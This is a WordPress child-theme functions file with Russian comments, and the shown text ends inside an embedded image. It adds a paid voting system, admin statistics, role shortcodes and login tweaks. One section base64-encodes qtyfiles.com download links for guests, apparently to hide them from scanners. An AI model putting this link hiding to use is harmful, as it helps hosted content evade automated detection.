<?php
function woffice_child_scripts() {
	if ( ! is_admin() && ! in_array( $GLOBALS['pagenow'], array( 'wp-login.php', 'wp-register.php' ) ) ) {
		$theme_info = wp_get_theme();
		wp_enqueue_style( 'woffice-child-stylesheet', get_stylesheet_uri(), array(), WOFFICE_THEME_VERSION );
	}

	if ( is_rtl() ) {
		wp_enqueue_style( 'woffice-child-rtl', get_template_directory_uri() . '/rtl.css', array(),WOFFICE_THEME_VERSION );
	}
	
}
add_action('wp_enqueue_scripts', 'woffice_child_scripts', 30);

/**
 * Force HTTP on localhost to prevent SSL protocol errors
 */
function woffice_child_force_http_on_localhost($url) {
    if (strpos($url, 'localhost') !== false) {
        return str_replace('https://', 'http://', $url);
    }
    return $url;
}
add_filter('template_directory_uri', 'woffice_child_force_http_on_localhost', 99);
add_filter('stylesheet_directory_uri', 'woffice_child_force_http_on_localhost', 99);
add_filter('home_url', 'woffice_child_force_http_on_localhost', 99);
add_filter('site_url', 'woffice_child_force_http_on_localhost', 99);
add_filter('plugins_url', 'woffice_child_force_http_on_localhost', 99);

add_action('after_setup_theme', function () {

	// Load custom translation file for the parent theme
	load_theme_textdomain( 'woffice', get_stylesheet_directory() . '/languages/' );

	// Load translation file for the child theme
	load_child_theme_textdomain( 'woffice', get_stylesheet_directory() . '/languages' );
});

// Напоминание https://aistudio.google.com/app/prompts?state=%7B%22ids%22:%5B%221D3UBsETfkjHnECMviGMMEfaIbt0Pmt0z%22%5D,%22action%22:%22open%22,%22userId%22:%22106426325981430699849%22,%22resourceKeys%22:%7B%7D%7D&usp=sharing
add_action('admin_notices', function() {
    if (current_user_can('administrator')) {
        echo '<div class="notice notice-warning is-dismissible">
            <p><strong>⚠️ ВНИМАНИЕ:</strong> Проверь работу скрипта синхронизации с QyyFiles и загляни в <code>debug.log</code>!</p>
        </div>';
    }
});

// для закрузки больших файлов в Gravity Forms
add_filter( 'gform_plupload_settings', function( $settings, $form_id, $field ) {
    // Устанавливаем размер одного кусочка (чанка). 
    // Для Cloudflare оптимально 5-10 МБ.
    $settings['chunk_size'] = '10mb';
    return $settings;
}, 10, 3 );

//скрытие ссылок от сканеров

/**
 * Hide qtyfiles.com links from guests
 * https://chatgpt.com/c/698120b4-b1a8-838c-95cd-7bbfd10888e8
 */

/* ------------------------------------------------------------------
 * 1. Обработка контента
 * ------------------------------------------------------------------ */
add_filter('the_content', 'woffice_hide_qtyfiles_links_safe_exclude_mycred', 20);

function woffice_hide_qtyfiles_links_safe_exclude_mycred($content) {

    // 🔒 ЗАЛОГИНЕННЫЕ ПОЛЬЗОВАТЕЛИ — БЕЗ ИЗМЕНЕНИЙ
    if (is_user_logged_in()) {
        return $content;
    }

    // 🚀 Быстрый выход
    if (stripos($content, 'qtyfiles.com') === false) {
        return $content;
    }

    $placeholders = [];
    $i = 0;

    /* --------------------------------------------------------------
     * 1. Временно вырезаем myCRED sell_this блоки
     * -------------------------------------------------------------- */
    $content = preg_replace_callback(
        '~\[mycred_sell_this[\s\S]*?\[/mycred_sell_this\]~i',
        function ($m) use (&$placeholders, &$i) {
            $key = '%%MYCRED_BLOCK_' . $i++ . '%%';
            $placeholders[$key] = $m[0];
            return $key;
        },
        $content
    );

/* --------------------------------------------------------------
 * 2. Прячем ссылки qtyfiles.com ТОЛЬКО внутри <div id="dl">
 * -------------------------------------------------------------- */
$content = preg_replace_callback(
    '~(<div\s+id=["\']dl["\'][^>]*>)([\s\S]*?)(</div>)~i',
    function ($m) {

        $open  = $m[1];
        $inner = $m[2];
        $close = $m[3];

        $inner = preg_replace_callback(
            '~<a\s+([^>]*?)href=["\'](https?://(?:www\.)?qtyfiles\.com/[^"\']+)["\']([^>]*)>(.*?)</a>~is',
            function ($a) {

                $before = $a[1];
                $url    = $a[2];
                $after  = $a[3];
                $inner  = $a[4];

                $encoded = base64_encode($url);

                // забираем существующие классы
                if (preg_match('~class=["\']([^"\']*)["\']~i', $before . $after, $cm)) {
                    $classes = $cm[1];
                    $before = preg_replace('~class=["\'][^"\']*["\']~i', '', $before);
                    $after  = preg_replace('~class=["\'][^"\']*["\']~i', '', $after);
                } else {
                    $classes = '';
                }

                // добавляем ТОЛЬКО js-dl
                $classes = trim($classes . ' js-dl');

                return '<a ' .
                       'class="' . esc_attr($classes) . '" ' .
                       $before .
                       'href="#" ' .
                       'data-link="' . esc_attr($encoded) . '" ' .
                       'rel="nofollow noopener" ' .
                       $after .
                       '>' .
                       wp_kses_post($inner) .
                       '</a>';
            },
            $inner
        );

        return $open . $inner . $close;
    },
    $content
);


    /* --------------------------------------------------------------
     * 3. Возвращаем myCRED блоки обратно
     * -------------------------------------------------------------- */
    if (!empty($placeholders)) {
        $content = strtr($content, $placeholders);
    }

    return $content;
}

/* ------------------------------------------------------------------
 * 2. JS для открытия ссылок
 * ------------------------------------------------------------------ */
add_action('wp_footer', function () {
?>
<script>
document.addEventListener('click', function(e) {
  const a = e.target.closest('a.js-dl');
  if (!a) return;

  e.preventDefault();
  try {
    const url = atob(a.dataset.link);
    if (url) {
      window.open(url, '_blank', 'noopener,noreferrer');
    }
  } catch (err) {}
});

// Accordion Toggle for Wiki
document.addEventListener('click', function(e) {
  const header = e.target.closest('.wiki-accordion-header');
  if (!header) return;
  const item = header.closest('.wiki-accordion-item');
  if (item) {
    item.classList.toggle('open');
  }
});
</script>
<?php
});


/**
 * Скрываем только часть текста (про инвайты), если регистрация отключена
 */
add_action('wp_head', 'woffice_hide_invite_only_text');
add_action('login_head', 'woffice_hide_invite_only_text');

function woffice_hide_invite_only_text() {
    if (!get_option('users_can_register')) {
        ?>
        <style type="text/css">
            
            .form-wrapper header p:nth-of-type(3), 
            .form-wrapper header p:nth-of-type(4) {
                display: none !important;
            }

            /* Немного поправим отступ у второго абзаца для красоты */
            .form-wrapper header p:nth-of-type(2) {
                margin-bottom: 10px;
            }
        </style>
        <?php
    }
}

// Добавьте асинхронную загрузку для стилей:
function add_async_attribute($tag, $handle) {
    if ('font-awesome' !== $handle) {
        return $tag;
    }
    return str_replace("rel='stylesheet'", "rel='stylesheet' onload='this.onload=null;this.rel=\"stylesheet\"'", $tag);
}
add_filter('style_loader_tag', 'add_async_attribute', 10, 2);

function change_captcha_error_message($translated_text, $text, $domain) {
    if ($text === 'Sorry, the captcha is not valid.') {
        return 'Sorry, the invite code is not valid.';
    }
    return $translated_text;
}
add_filter('gettext', 'change_captcha_error_message', 10, 3);



// роль временщика по умолчанию
function set_new_user_role_provisional($user_id) {
    $user = new WP_User($user_id);
    $user->set_role('provisional'); 
}
add_action('user_register', 'set_new_user_role_provisional');

// Перемещение курсора в конец поста
function custom_editor_focus() {
    ?>
    <script>
    jQuery(document).ready(function($) {
    // Проверяем, находимся ли мы на странице редактирования поста
    if ($('body').hasClass('post-php') || $('body').hasClass('post-new-php')) {
        
        // Функция для установки курсора в конец текстового поля
        function focusAtEnd() {
            const textarea = document.getElementById('content');
            if (textarea) {
                textarea.focus();
                if (document.activeElement === textarea) {
                    textarea.selectionStart = textarea.selectionEnd = textarea.value.length;
                    textarea.scrollTop = textarea.scrollHeight;
                }
            }
        }

        // Запускаем с задержкой для полной загрузки страницы
        requestAnimationFrame(focusAtEnd);

        // Обработчик для кнопки переключения HTML-режима
        $('#content-html').on('click', function() {
            requestAnimationFrame(focusAtEnd);
        });

        // Отслеживание изменений класса на wp-content-wrap
        const editorWrap = document.getElementById('wp-content-wrap');
        if (editorWrap) {
            const observer = new MutationObserver((mutations) => {
                for (const mutation of mutations) {
                    if (mutation.attributeName === 'class' && $(editorWrap).hasClass('html-active')) {
                        requestAnimationFrame(focusAtEnd);
                    }
                }
            });

            observer.observe(editorWrap, { attributes: true });
        }
    }
});

    </script>
    <?php
}
add_action('admin_footer', 'custom_editor_focus');

// вывод аватарок пользователей
function bp_user_avatars_by_role_shortcode($atts) {
    $atts = shortcode_atts(
        array(
            'role' => 'subscriber', // Укажите роль, например, 'administrator', 'editor', 'author' и т. д.
            'size' => 40, // Размер аватарки
            'limit' => 500 // Количество пользователей
        ),
        $atts,
        'user_avatars'
    );

    $args = array(
        'role'    => $atts['role'],
        'number'  => $atts['limit'],
        'fields'  => array('ID', 'display_name')
    );

    $users = get_users($args);
    if (empty($users)) {
        return '<p>Нет пользователей с этой ролью.</p>';
    }

    $output = '<div class="user-avatars">';
    foreach ($users as $user) {
        $avatar = bp_core_fetch_avatar(array(
            'item_id' => $user->ID,
            'type'    => 'thumb',
            'width'   => $atts['size'],
            'height'  => $atts['size'],
            'html'    => false
        ));

        $output .= '<div class="user-avatar">';
        $output .= '<img src="' . esc_url($avatar) . '" alt="' . esc_attr($user->display_name) . '" width="' . esc_attr($atts['size']) . '" height="' . esc_attr($atts['size']) . '">';
        $output .= '</div>';
    }
    $output .= '</div>';

    return $output;
}
add_shortcode('user_avatars', 'bp_user_avatars_by_role_shortcode');

/**
 * Голосование для типа записи "request"
 */

// Метабокс для отображения голосов
function add_vote_meta_boxes() {
    add_meta_box(
        'request_votes',
        __('Voting Stats'),
        'render_vote_meta_box',
        'request',
        'side',
        'default'
    );
}
add_action('add_meta_boxes', 'add_vote_meta_boxes');

function render_vote_meta_box($post) {
    $votes = get_post_meta($post->ID, '_request_votes', true);
    $votes = $votes ? $votes : 0;
    echo '<p>Total Votes: <strong>' . $votes . '</strong></p>';
}

// AJAX обработчики
function handle_vote_ajax() {
    if (!isset($_POST['post_id']) || !isset($_POST['nonce'])) {
        wp_send_json_error(['message' => __('Invalid request.', 'woffice')]);
    }

    $post_id = intval($_POST['post_id']);
    $user_id = get_current_user_id();

    if (!wp_verify_nonce($_POST['nonce'], 'vote_action_' . $post_id)) {
        wp_send_json_error(['message' => __('Security check failed.', 'woffice')]);
    }

    if (!user_can_vote($user_id, $post_id)) {
        wp_send_json_error(['message' => __('You have reached your daily voting limit.', 'woffice')]);
    }

    // Обновляем голоса
    $votes = get_post_meta($post_id, '_request_votes', true);
    $votes = $votes ? $votes : 0;
    $new_votes = $votes + 1;
    update_post_meta($post_id, '_request_votes', $new_votes);

    // Обновляем метаданные пользователя
    $vote_count = get_user_meta($user_id, '_vote_count', true);
    update_user_meta($user_id, '_vote_count', $vote_count + 1);
    update_user_meta($user_id, '_last_vote_time', time());

    wp_send_json_success([
        'message' => __('Vote successful!', 'woffice'),
        'votes' => $new_votes
    ]);
}

function handle_paid_vote_ajax() {
    if (!isset($_POST['post_id']) || !isset($_POST['nonce'])) {
        wp_send_json_error(['message' => __('Invalid request.', 'woffice')]);
    }

    $post_id = intval($_POST['post_id']);
    $user_id = get_current_user_id();

    if (!wp_verify_nonce($_POST['nonce'], 'paid_vote_action_' . $post_id)) {
        wp_send_json_error(['message' => __('Security check failed.', 'woffice')]);
    }

    if (!user_can_vote_by_role($user_id)) {
        wp_send_json_error(['message' => __('Voting is not available for your role.', 'woffice')]);
    }

    // Проверка баланса
    if (!function_exists('mycred_get_users_balance')) {
        wp_send_json_error(['message' => __('Payment system not available.', 'woffice')]);
    }

    $balance = mycred_get_users_balance($user_id, 'diamonds');
    if ($balance < 50) {
        wp_send_json_error(['message' => __('You need at least 50 Diamonds to vote.', 'woffice')]);
    }

    // Списание средств
    mycred_subtract(
        'paid_vote', 
        $user_id, 
        50, 
        __('Paid vote for post #', 'woffice') . $post_id, 
        '', 
        '', 
        'diamonds'
    );

    // Обновление голосов
    $votes = get_post_meta($post_id, '_request_votes', true);
    $new_votes = ($votes ? $votes : 0) + 1;
    update_post_meta($post_id, '_request_votes', $new_votes);

    wp_send_json_success([
        'message' => __('Paid vote successful! 50 Diamonds deducted.', 'woffice'),
        'votes' => $new_votes
    ]);
}

add_action('wp_ajax_handle_vote', 'handle_vote_ajax');
add_action('wp_ajax_nopriv_handle_vote', 'handle_vote_ajax');
add_action('wp_ajax_handle_paid_vote', 'handle_paid_vote_ajax');
add_action('wp_ajax_nopriv_handle_paid_vote', 'handle_paid_vote_ajax');

// Проверка возможности голосования
function user_can_vote($user_id, $post_id) {
    if (!user_can_vote_by_role($user_id)) {
        return false;
    }

    $last_vote_time = get_user_meta($user_id, '_last_vote_time', true);
    $vote_count = get_user_meta($user_id, '_vote_count', true);

    if (empty($last_vote_time)) update_user_meta($user_id, '_last_vote_time', 0);
    if (empty($vote_count)) update_user_meta($user_id, '_vote_count', 0);

    if ((time() - $last_vote_time) >= 86400) {
        update_user_meta($user_id, '_vote_count', 0);
        update_user_meta($user_id, '_last_vote_time', time());
        return true;
    }

    return $vote_count < 2;
}

// Проверка роли пользователя
function user_can_vote_by_role($user_id) {
    $user = get_userdata($user_id);
    return $user && !empty($user->roles) && 
          (in_array('eminent', $user->roles) || in_array('editor', $user->roles) || in_array('contributor', $user->roles) || in_array('subscriber', $user->roles));
}

// Функция для получения ТОП-5 записей
function get_top_voted_posts($limit = 5) {
    $args = [
        'post_type' => 'request',
        'posts_per_page' => $limit,
        'meta_key' => '_request_votes',
        'orderby' => 'meta_value_num',
        'order' => 'DESC',
        'post_status' => 'publish'
    ];
    return get_posts($args);
}

// Отображение кнопок голосования
function display_vote_buttons($post_id) {
    if (!is_user_logged_in()) {
        echo '<a href="'.wp_login_url(get_permalink()).'" class="vote-login">'.__('Login to vote', 'woffice').'</a>';
        return;
    }

    $user_id = get_current_user_id();
    $can_vote_free = user_can_vote($user_id, $post_id);
    $balance = function_exists('mycred_get_users_balance') ? mycred_get_users_balance($user_id, 'diamonds') : 0;
    
    echo '<div class="voting-wrapper">'; // Основной контейнер для двух блоков
    echo '<div class="voting-buttons-container">'; // Контейнер для голосования
    
    // Блок счётчика
    $votes = get_post_meta($post_id, '_request_votes', true);
    echo '<div class="vote-counter">
            <span class="vote-label">'.__('Total Votes:', 'woffice').'</span>
            <span class="vote-count">'.($votes ?: 0).'</span>
          </div>';

    // Бесплатное голосование
    if ($can_vote_free) {
        echo '<form class="vote-form">
                '.wp_nonce_field('vote_action_' . $post_id, 'nonce', true, false).'
                <input type="hidden" name="post_id" value="'.$post_id.'">
                <button type="button" class="btn-vote-free">
                <i class="fab fa-angellist"></i> '.__(' Vote Free / daily limit', 'woffice').'</button>
              </form>';
    } else {
        echo '<p class="vote-limit">'.__('Daily free votes limit reached!', 'woffice').'</p>';
    }

    // Платное голосование
    echo '<form class="paid-vote-form">
            '.wp_nonce_field('paid_vote_action_' . $post_id, 'paid_nonce', true, false).'
            <input type="hidden" name="post_id" value="'.$post_id.'">
            <button type="button" class="btn-vote-paid" '.($balance < 50 ? 'disabled' : '').'>
              <i class="fas fa-gem"></i> '.__('Vote / 50 diamonds', 'woffice').'
            </button>
          </form>';

    echo '</div>'; // Закрываем voting-buttons-container

    // Блок "Upcoming buys based on your votes"
    echo '<div class="upcoming-buys">';
    echo '<h3 class="upcoming-title"><i class="fas fa-shopping-cart"></i> '.__('Upcoming buys based on your votes', 'woffice').'</h3>';
    
    $top_posts = get_top_voted_posts(5);
    if (!empty($top_posts)) {
        echo '<ul class="upcoming-list">';
        foreach ($top_posts as $post) {
            $votes = get_post_meta($post->ID, '_request_votes', true);
            echo '<li class="upcoming-item">
                    <a href="'.esc_url(get_permalink($post->ID)).'" 
                       class="post-title-link" 
                       target="_blank" 
                       title="'.__('View post', 'woffice').'">
                       '.esc_html($post->post_title).'
                    </a>
                    <span class="post-votes">'.($votes ?: 0).' '.__('votes', 'woffice').'</span>
                  </li>';
        }
        echo '</ul>';
    } else {
        echo '<p class="no-upcoming">'.__('No voted posts yet', 'woffice').'</p>';
    }
    
    echo '</div>'; // Закрываем upcoming-buys
    echo '</div>'; // Закрываем voting-wrapper

    // Обновленные стили
    echo '<style>
        .voting-wrapper {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            align-items: start;
            max-width: 1200px;
            margin: 0 auto;
        }
        .voting-buttons-container {
            background: #ffffff;
            padding: 20px;
            border-radius: 8px;
            border: 1px solid #dee2e6;
        }
        .upcoming-buys {
            background: #ffffff;
            padding: 20px;
            border-radius: 8px;
            border: 1px solid #dee2e6;
        }
        .post-title-link {
            color: #0073aa;
            text-decoration: none;
            transition: color 0.3s ease;
        }
        .post-title-link:hover {
            color: #00a0d2;
        }
        .upcoming-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 0;
            border-bottom: 1px solid #eee;
        }
        .post-votes {
            background: #e9ecef;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 0.9em;
        }
        @media (max-width: 768px) {
            .voting-wrapper {
                grid-template-columns: 1fr;
            }
        }
    </style>';
}

// Шоткод
function voting_buttons_shortcode() {
    ob_start();
    if (get_post_type() === 'request' && get_the_ID()) {
        display_vote_buttons(get_the_ID());
    }
    return ob_get_clean();
}
add_shortcode('voting_buttons', 'voting_buttons_shortcode');

// JavaScript
function voting_buttons_scripts() {
    wp_enqueue_script('voting-script', get_stylesheet_directory_uri() . '/js/voting.js', ['jquery'], null, true);
    wp_localize_script('voting-script', 'voting_ajax', [
        'ajax_url' => admin_url('admin-ajax.php')
    ]);
}
add_action('wp_enqueue_scripts', 'voting_buttons_scripts');

/**
 * Добавляем страницу статистики в админке
 */
function add_vote_stats_page() {
    add_menu_page(
        'Vote Statistics', // Заголовок страницы
        'Vote Stats',      // Название в меню
        'manage_options',  // Права доступа
        'vote-stats',      // Слаг страницы
        'render_vote_stats_page', // Функция для отображения
        'dashicons-chart-bar', // Иконка
        6                  // Позиция в меню
    );
}
add_action('admin_menu', 'add_vote_stats_page');

/**
 * Функция для отображения страницы статистики
 */
function render_vote_stats_page() {
    // Проверка прав доступа
    if (!current_user_can('manage_options')) {
        wp_die(__('You do not have sufficient permissions to access this page.', 'woffice'));
    }

    // Получаем все посты типа "request" с сортировкой по голосам
    $args = [
        'post_type' => 'request',
        'posts_per_page' => -1,
        'meta_key' => '_request_votes',
        'orderby' => 'meta_value_num',
        'order' => 'DESC',
        'post_status' => 'publish'
    ];
    $posts = get_posts($args);

    // Начало вывода страницы
    echo '<div class="wrap">';
    echo '<h1>' . __('Vote Statistics', 'woffice') . '</h1>';
    
    // Таблица с данными
    echo '<table class="wp-list-table widefat fixed striped">';
    echo '<thead>
            <tr>
                <th>' . __('Post ID', 'woffice') . '</th>
                <th>' . __('Post Title', 'woffice') . '</th>
                <th>' . __('Votes', 'woffice') . '</th>
                <th>' . __('Actions', 'woffice') . '</th>
            </tr>
          </thead>';
    echo '<tbody>';

    if (!empty($posts)) {
        foreach ($posts as $post) {
            $votes = get_post_meta($post->ID, '_request_votes', true);
            $votes = $votes ? $votes : 0;

            echo '<tr>
                    <td>' . esc_html($post->ID) . '</td>
                    <td>
                        <a href="' . esc_url(get_permalink($post->ID)) . '" 
                           target="_blank" 
                           title="' . __('View on site', 'woffice') . '">
                           ' . esc_html($post->post_title) . '
                        </a>
                    </td>
                    <td>' . esc_html($votes) . '</td>
                    <td>
                        <a href="' . esc_url(get_edit_post_link($post->ID)) . '" 
                           class="button button-primary" 
                           title="' . __('Edit post', 'woffice') . '">
                           ' . __('Edit', 'woffice') . '
                        </a>
                    </td>
                  </tr>';
        }
    } else {
        echo '<tr><td colspan="4">' . __('No posts found.', 'woffice') . '</td></tr>';
    }

    echo '</tbody>';
    echo '</table>';
    echo '</div>';
}

/**
 * Стили для страницы статистики
 */
function vote_stats_admin_styles() {
    echo '
    <style>
    .wp-list-table {
        margin-top: 20px;
    }
    .wp-list-table th, 
    .wp-list-table td {
        padding: 12px;
        vertical-align: middle;
    }
    .wp-list-table th {
        background-color: #f6f7f7;
        border-bottom: 2px solid #ccd0d4;
    }
    .wp-list-table tr:nth-child(odd) {
        background-color: #fbfbfb;
    }
    .wp-list-table tr:hover {
        background-color: #f6f7f7;
    }
    .button.button-primary {
        padding: 4px 10px;
        height: auto;
        line-height: 1.5;
    }
    </style>
    ';
}
add_action('admin_head', 'vote_stats_admin_styles');



/**
 * Автоматическое удаление метаполей при смене типа записи.
 * v2: Используется правильный хук 'post_updated' для отслеживания смены типа поста.
 */
if (!function_exists('my_community_delete_meta_on_type_change')) {
    function my_community_delete_meta_on_type_change($post_id, $post_after, $post_before) {
        // Получаем старый и новый типы записей
        $old_type = $post_before->post_type;
        $new_type = $post_after->post_type;

        // Проверяем, был ли изменен тип записи ИМЕННО С 'request' на что-то другое
        if ($old_type === 'request' && $new_type !== 'request') {
            
            // Удаляем все нужные метаполя
            delete_post_meta($post_id, '_request_votes');
            delete_post_meta($post_id, 'price');
            delete_post_meta($post_id, 'publication_date_meta');

            // Можно добавить логирование для проверки
            // error_log('Метаполя для поста ID ' . $post_id . ' были удалены из-за смены типа с ' . $old_type . ' на ' . $new_type);
        }
    }
    // Используем правильный хук с тремя аргументами
    add_action('post_updated', 'my_community_delete_meta_on_type_change', 10, 3);
}

// Подключение SweetAlert2
function enqueue_sweetalert2() {
    // Подключаем SweetAlert2 CSS
    wp_enqueue_style('sweetalert2', 'https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css');

    // Подключаем SweetAlert2 JS
    wp_enqueue_script('sweetalert2', 'https://cdn.jsdelivr.net/npm/sweetalert2@11', [], null, true);
}
add_action('wp_enqueue_scripts', 'enqueue_sweetalert2');

// Предположим, вы хотите заменить текст "Оставить комментарий" на "Написать что-нибудь"
// Использование функции esc_html__ для безопасности:

// инфоблок вместо комментариев
 function func_check_user_role( $atts, $content = null ) {
    $user = wp_get_current_user();
    $user_role = $atts['role'];
    $allowed_roles = [];
    array_push($allowed_roles , $user_role);

if ( is_user_logged_in() && array_intersect($allowed_roles, $user->roles ) ) {
      return $content;
 } else {
    return '';
}

}
add_shortcode( 'check-user-role', 'func_check_user_role' );

// Медленная загрузка редактора поста https://wordpress.stackexchange.com/questions/187612/admin-very-slow-edit-page-caused-by-core-meta-query
function set_postmeta_choice( $string, $post ) {
    $meta_keys = array();
    foreach(has_meta( $post->ID ) as $meta){
        $meta_keys[] = $meta["meta_key"];
    }
    return $meta_keys;
}
add_filter( 'postmeta_form_keys', 'set_postmeta_choice', 10, 3 );

//Удалить indicates required fields в формах
add_filter( 'gform_required_legend', '__return_empty_string' );

  
// удалить логотип WordPress
function remove_wp_logo_login() {
    echo '<style type="text/css">
        #login h1 a { display: none; }
    </style>';
}
add_action('login_enqueue_scripts', 'remove_wp_logo_login');

 // Шорткод плейлиста со стилями
function pl_short() {
return '<img style="margin-top: -29px; opacity: 0.35; width: 34px; position: absolute; right: 0; margin-right: 72px;" src="data:image/png;base64,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